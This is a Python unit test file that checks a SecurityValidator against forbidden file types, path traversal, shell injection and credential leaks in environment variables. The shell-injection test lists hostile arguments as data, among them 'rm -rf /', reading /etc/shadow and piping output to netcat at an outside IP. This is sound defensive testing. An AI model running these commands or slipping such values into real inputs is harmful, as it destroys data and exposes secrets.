"""Unit tests for Phase 12 execution security boundaries and input validation."""

from researchlens.execution.security import SecurityValidator


def test_entrypoint_forbidden_extensions_rejection():
    # Rejects executables, scripts, and notebooks
    forbidden = [
        "exploit.exe",
        "run.bat",
        "test.ps1",
        "notebook.ipynb",
        "eval.sh",
        "lib.dll",
    ]
    for fn in forbidden:
        ok, err = SecurityValidator.validate_entrypoint(fn)
        assert ok is False
        assert "Prohibited executable" in err or "must be a valid Python script" in err


def test_entrypoint_path_traversal_rejection():
    traversal_paths = [
        "../etc/passwd.py",
        "..\\windows\\system32.py",
        "/absolute/path/script.py",
        "scripts/../../root.py",
    ]
    for tp in traversal_paths:
        ok, err = SecurityValidator.validate_entrypoint(tp)
        assert ok is False
        assert "Path traversal" in err


def test_shell_injection_detection_in_arguments():
    dangerous_args = [
        "valid_arg; rm -rf /",
        "arg && cat /etc/shadow",
        "test | nc 1.2.3.4 9999",
        "param`touch /tmp/hacked`",
        "value$(whoami)",
        "multi\nline",
    ]
    for da in dangerous_args:
        ok, err = SecurityValidator.validate_command_arguments([da])
        assert ok is False
        assert "Dangerous shell character" in err


def test_environment_variable_credential_masking():
    dirty_env = {
        "OPENAI_API_KEY": "sk-1234567890abcdef",
        "AWS_SECRET_ACCESS_KEY": "secret_aws_token",
        "DB_PASSWORD": "super_secret_pw",
        "AUTH_TOKEN": "bearer_987654321",
        "NORMAL_PATH": "/usr/local/bin",
        "PYTHONPATH": "src",
    }
    clean = SecurityValidator.sanitize_env_vars(dirty_env)

    assert clean["OPENAI_API_KEY"] == "[REDACTED_CREDENTIAL]"
    assert clean["AWS_SECRET_ACCESS_KEY"] == "[REDACTED_CREDENTIAL]"
    assert clean["DB_PASSWORD"] == "[REDACTED_CREDENTIAL]"
    assert clean["AUTH_TOKEN"] == "[REDACTED_CREDENTIAL]"
    assert clean["NORMAL_PATH"] == "/usr/local/bin"
    assert clean["PYTHONPATH"] == "src"
